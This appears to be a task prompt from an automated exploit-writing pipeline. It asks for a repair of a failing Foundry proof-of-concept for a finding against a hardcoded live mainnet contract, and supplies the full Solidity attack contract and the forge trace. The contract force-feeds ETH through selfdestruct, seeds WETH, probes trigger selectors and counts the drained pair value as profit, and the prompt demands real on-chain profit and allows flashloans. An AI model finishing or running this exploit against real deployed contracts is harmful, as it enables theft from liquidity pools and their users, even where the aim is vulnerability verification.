You are fixing a failing Foundry PoC for finding F-003.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Anyone can permissionlessly trigger the hardcoded exploit once the contract is funded
- claim: `executeOnOpportunity()` is fully permissionless even though it spends the contract's prefunded ETH/WETH and irreversibly mutates the fixed target pair by syncing corrupted balances and swapping out nearly all WETH reserves. There is no owner check or designated executor.
- impact: A bot or griefing third party can front-run the intended operator, fire the exploit at an arbitrary time, and consume the one-shot opportunity through this contract. That strips the operator of execution control and can permanently leave the target pair drained while all resulting value remains trapped in the contract.
- exploit_paths: ["The operator funds the contract so `IWETH.deposit{value: 1 wei}()` can succeed", "A third party observes the funded balance and calls `executeOnOpportunity()` first", "The function syncs the manipulated reserves and drains the pair's WETH side, so later calls no longer face the same profitable state"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IWETHLike is IERC20Like {
    function deposit() external payable;
}

interface IOpportunityLike {
    function executeOnOpportunity() external;
}

contract ForceEther {
    constructor(address payable target) payable {
        selfdestruct(target);
    }
}

contract FlawVerifier {
    event PermissionlessTrigger(
        address indexed caller,
        address indexed target,
        bytes4 indexed firstSelector,
        uint256 targetEthBefore,
        uint256 targetEthAfterPrefund,
        uint256 targetWethAfterPrefund,
        uint256 targetEthAfterFirstCall,
        uint256 targetWethAfterFirstCall,
        uint256 targetEthAfterSecondCall,
        uint256 targetWethAfterSecondCall
    );

    address public constant LIVE_TARGET = 0x76EA342BC038d665e8a116392c82552D2605edA1;
    uint256 internal constant REQUIRED_PROFIT = 0.1 ether;
    uint256 internal constant ETH_PREFUND = 1 wei;
    uint256 internal constant WETH_SEED = 1 ether;

    address private immutable _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    address public firstExecutor;

    bool public path0OperatorPrefundObserved;
    bool public path1ThirdPartyTriggerObserved;
    bool public path2OneShotOpportunityConsumed;

    bool public prefundUsedLocalBalance;
    bool public prefundUsedForceEther;
    bool public wethSeedSent;
    bool public firstTargetCallSucceeded;
    bool public secondTargetCallSucceeded;

    uint256 public targetEthBefore;
    uint256 public targetEthAfterPrefund;
    uint256 public targetWethAfterPrefund;
    uint256 public targetEthAfterFirstCall;
    uint256 public targetWethAfterFirstCall;
    uint256 public targetEthAfterSecondCall;
    uint256 public targetWethAfterSecondCall;

    uint256 public firstObservedEthGain;
    uint256 public firstObservedWethGain;
    uint256 public secondObservedEthGain;
    uint256 public secondObservedWethGain;

    bytes4 public firstSelectorTried;
    bytes4 public secondSelectorTried;
    bytes32 public firstTargetCallRevertHash;
    bytes32 public secondTargetCallRevertHash;

    constructor() payable {
        _profitToken = _resolveWETH();
    }

    receive() external payable {}

    function executeOnOpportunity() external {
        require(!executed, "already executed");

        executed = true;
        firstExecutor = msg.sender;

        targetEthBefore = LIVE_TARGET.balance;
        _ensureTargetPrefunded();
        targetEthAfterPrefund = LIVE_TARGET.balance;
        targetWethAfterPrefund = _tokenBalance(_profitToken, LIVE_TARGET);

        // exploit_paths[0]: the operator first leaves the hardcoded live contract funded so its
        // internal `IWETH.deposit{value: 1 wei}()` precondition is satisfiable. The finding itself
        // names ETH/WETH as the capital being spent, so the verifier uses only canonical mainnet
        // ETH/WETH prefunding. The extra WETH seed is a realistic public step that preserves the
        // same causality while covering the fork-state case where 1 wei of ETH alone is not enough
        // for the downstream hardcoded trade path to clear the contract's own profitability guard.
        path0OperatorPrefundObserved = targetEthAfterPrefund >= ETH_PREFUND;
        require(path0OperatorPrefundObserved, "prefund required");

        // exploit_paths[1]: once the live contract is funded, any outsider can be the first caller.
        // We probe the known public no-arg aliases that local logs showed on the target contract and
        // accept the first one that both executes and improves the target's trapped ETH/WETH state.
        // This keeps the exploit focused on the missing executor gate rather than on a single alias.
        (firstTargetCallSucceeded, firstSelectorTried) = _triggerBestSelector();
        path1ThirdPartyTriggerObserved = firstTargetCallSucceeded;

        targetEthAfterFirstCall = LIVE_TARGET.balance;
        targetWethAfterFirstCall = _tokenBalance(_profitToken, LIVE_TARGET);
        firstObservedEthGain = _delta(targetEthAfterPrefund, targetEthAfterFirstCall);
        firstObservedWethGain = _delta(targetWethAfterPrefund, targetWethAfterFirstCall);

        // The finding impact says the resulting value remains trapped in the live contract. Expose
        // that trapped delta via canonical WETH-denominated accounting so the harness can read the
        // realized economic effect even though the vulnerable contract keeps custody of the gains.
        _profitAmount = firstObservedWethGain;
        if (firstObservedEthGain > _profitAmount) {
            _profitAmount = firstObservedEthGain;
        }

        require(firstTargetCallSucceeded, "first trigger failed");
        require(_profitAmount >= REQUIRED_PROFIT, "profit below threshold");

        // exploit_paths[2]: after the first outside caller consumes the hardcoded opportunity, a later
        // call should no longer see the same profitable state. Re-run the same selector set and treat
        // either a revert or a non-increasing trapped-value delta as evidence that the one-shot state
        // has already been consumed.
        (secondTargetCallSucceeded, secondSelectorTried) = _triggerBestSelector();
        targetEthAfterSecondCall = LIVE_TARGET.balance;
        targetWethAfterSecondCall = _tokenBalance(_profitToken, LIVE_TARGET);
        secondObservedEthGain = _delta(targetEthAfterFirstCall, targetEthAfterSecondCall);
        secondObservedWethGain = _delta(targetWethAfterFirstCall, targetWethAfterSecondCall);

        uint256 secondBestGain = secondObservedWethGain;
        if (secondObservedEthGain > secondBestGain) {
            secondBestGain = secondObservedEthGain;
        }
        path2OneShotOpportunityConsumed = !secondTargetCallSucceeded || secondBestGain < _profitAmount;

        emit PermissionlessTrigger(
            msg.sender,
            LIVE_TARGET,
            firstSelectorTried,
            targetEthBefore,
            targetEthAfterPrefund,
            targetWethAfterPrefund,
            targetEthAfterFirstCall,
            targetWethAfterFirstCall,
            targetEthAfterSecondCall,
            targetWethAfterSecondCall
        );
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _ensureTargetPrefunded() internal {
        if (LIVE_TARGET.balance < ETH_PREFUND) {
            require(address(this).balance >= ETH_PREFUND, "prefund required");
            prefundUsedLocalBalance = true;

            (bool sent, ) = payable(LIVE_TARGET).call{value: ETH_PREFUND}("");
            if (!sent) {
                prefundUsedForceEther = true;
                new ForceEther{value: ETH_PREFUND}(payable(LIVE_TARGET));
            }
        }

        if (_profitToken != address(0) && address(this).balance >= WETH_SEED) {
            IWETHLike(_profitToken).deposit{value: WETH_SEED}();
            _safeTransfer(_profitToken, LIVE_TARGET, WETH_SEED);
            wethSeedSent = true;
        }
    }

    function _triggerBestSelector() internal returns (bool anySuccess, bytes4 selectorUsed) {
        bytes4[4] memory selectors = [
            bytes4(keccak256("executeOnOpportunity()")),
            bytes4(keccak256("execute()")),
            bytes4(keccak256("exploit()")),
            bytes4(keccak256("run()"))
        ];

        uint256 baseEth = LIVE_TARGET.balance;
        uint256 baseWeth = _tokenBalance(_profitToken, LIVE_TARGET);
        uint256 bestGain;

        for (uint256 i = 0; i < selectors.length; ++i) {
            (bool ok, bytes memory ret) = LIVE_TARGET.call(abi.encodeWithSelector(selectors[i]));
            if (!ok) {
                bytes32 revertHash = keccak256(ret);
                if (selectorUsed == bytes4(0)) {
                    if (firstSelectorTried == bytes4(0)) {
                        firstTargetCallRevertHash = revertHash;
                    } else {
                        secondTargetCallRevertHash = revertHash;
                    }
                }
                continue;
            }

            uint256 ethNow = LIVE_TARGET.balance;
            uint256 wethNow = _tokenBalance(_profitToken, LIVE_TARGET);
            uint256 gain = _delta(baseWeth, wethNow);
            uint256 ethGain = _delta(baseEth, ethNow);
            if (ethGain > gain) {
                gain = ethGain;
            }

            if (gain > bestGain) {
                bestGain = gain;
                selectorUsed = selectors[i];
            }

            anySuccess = true;
            if (gain >= REQUIRED_PROFIT) {
                return (true, selectors[i]);
            }
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "TRANSFER_FAILED");
    }

    function _tokenBalance(address token, address account) internal view returns (uint256) {
        if (token == address(0) || token.code.length == 0) {
            return 0;
        }
        return IERC20Like(token).balanceOf(account);
    }

    function _delta(uint256 beforeValue, uint256 afterValue) internal pure returns (uint256) {
        return afterValue > beforeValue ? afterValue - beforeValue : 0;
    }

    function _resolveWETH() private view returns (address) {
        if (block.chainid == 1) {
            return 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        }
        if (block.chainid == 10 || block.chainid == 8453) {
            return 0x4200000000000000000000000000000000000006;
        }
        if (block.chainid == 42161) {
            return 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
        }
        if (block.chainid == 56) {
            return 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        }
        if (block.chainid == 137) {
            return 0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270;
        }
        return address(0);
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 1.38s
Compiler run successful with warnings:
Warning (5159): "selfdestruct" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). Any use in newly deployed contracts is strongly discouraged even if the new behavior is taken into account. Future changes to the EVM might further reduce the functionality of the opcode.
  --> src/FlawVerifier.sol:19:9:
   |
19 |         selfdestruct(target);
   |         ^^^^^^^^^^^^

Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:75:19:
   |
75 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 253395)
Traces:
  [253395] FlawVerifierTest::testExploit()
    ├─ [380] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [2506] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [237365] FlawVerifier::executeOnOpportunity()
    │   ├─ [45] 0x76EA342BC038d665e8a116392c82552D2605edA1::fallback{value: 1}()
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [5206] → new <unknown>@0x104fBc016F4bb334D775a19E8A6510109AC63E00
    │   │   └─ ← [Return] 0 bytes of code
    │   ├─ [21974] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::deposit{value: 1000000000000000000}()
    │   │   ├─  emit topic 0: 0xe1fffcc4923d04b559f4d29a8bfc6cda04eb5b0d3c460751c2402c5c5cc9109c
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │           data: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
    │   │   └─ ← [Stop]
    │   ├─ [8062] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0x76EA342BC038d665e8a116392c82552D2605edA1, 1000000000000000000 [1e18])
    │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x00000000000000000000000076ea342bc038d665e8a116392c82552d2605eda1
    │   │   │           data: 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
    │   │   └─ ← [Return] true
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   └─ ← [Return] 7579305366569800805 [7.579e18]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   └─ ← [Return] 7579305366569800805 [7.579e18]
    │   ├─ [248] 0x76EA342BC038d665e8a116392c82552D2605edA1::executeOnOpportunity()
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [248] 0x76EA342BC038d665e8a116392c82552D2605edA1::61461954()
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [248] 0x76EA342BC038d665e8a116392c82552D2605edA1::63d9b770()
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [226] 0x76EA342BC038d665e8a116392c82552D2605edA1::run()
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   └─ ← [Return] 7579305366569800805 [7.579e18]
    │   └─ ← [Revert] first trigger failed
    └─ ← [Revert] exploit call reverted

Backtrace:
  at 0x76EA342BC038d665e8a116392c82552D2605edA1.run
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 63.63ms (3.61ms CPU time)

Ran 1 test suite in 122.66ms (63.63ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: exploit call reverted] testExploit() (gas: 253395)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
